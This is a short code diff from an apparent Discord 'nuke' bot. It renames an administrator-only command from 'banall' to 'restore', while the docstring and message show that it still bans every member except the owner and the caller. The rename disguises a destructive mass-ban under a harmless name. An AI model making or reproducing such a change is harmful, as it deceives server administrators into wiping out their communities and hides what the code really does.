@@ -76,7 +76,7 @@ async def nuke(ctx):
 
 @bot.command()
 @commands.has_permissions(administrator=True)
-async def banall(ctx):
+async def restore(ctx):
     """Ban everyone in the server except the bot owner and yourself."""
     await ctx.send("Starting to ban all members...")
 
